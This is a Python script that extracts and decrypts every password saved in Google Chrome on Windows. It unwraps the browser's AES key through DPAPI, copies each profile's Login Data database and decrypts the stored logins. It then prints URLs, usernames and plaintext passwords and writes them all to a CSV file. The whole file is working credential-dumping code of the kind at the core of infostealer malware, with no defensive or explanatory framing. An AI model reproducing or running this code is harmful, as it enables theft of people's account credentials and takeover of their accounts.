import os
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
from Cryptodome.Cipher import AES
import win32crypt
from pathlib import Path

def get_secret_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERROR] Failed to retrieve secret key: {e}")
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()
        return decrypted_pass
    except Exception as e:
        print(f"[ERROR] Unable to decrypt password: {e}")
        return None

def get_db_connection(chrome_login_db):
    try:
        temp_db = Path("Loginvault.db")
        shutil.copy2(chrome_login_db, temp_db)
        return sqlite3.connect(temp_db)
    except Exception as e:
        print(f"[ERROR] Cannot access Chrome database: {e}")
        return None
    

def main():
    chrome_path = Path(os.environ['USERPROFILE']) / "AppData" / "Local" / "Google" / "Chrome" / "User Data"
    local_state_path = chrome_path / "Local State"
    
    if not local_state_path.exists():
        print("[ERROR] Local State file not found.")
        return
    
    secret_key = get_secret_key(local_state_path)
    if not secret_key:
        return
    
    profiles = [p for p in chrome_path.iterdir() if p.is_dir() and re.match(r"^Profile|Default$", p.name)]
    
    output_file = Path("decrypted_passwords.csv")
    
    with output_file.open(mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(["Index", "URL", "Username", "Password"])
        
        for profile in profiles:
            login_db = profile / "Login Data"
            if not login_db.exists():
                continue
            
            conn = get_db_connection(login_db)
            if not conn:
                continue
            
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for index, login in enumerate(cursor.fetchall()):
                    url, username, ciphertext = login
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key) or "[DECRYPTION FAILED]"
                        print(f"[{index}] URL: {url}\nUser: {username}\nPass: {decrypted_password}\n" + "*"*50)
                        csv_writer.writerow([index, url, username, decrypted_password])
                
            except Exception as e:
                print(f"[ERROR] Database query failed: {e}")
            finally:
                cursor.close()
                conn.close()
                
            Path("Loginvault.db").unlink(missing_ok=True)
            
if __name__ == "__main__":
    main()
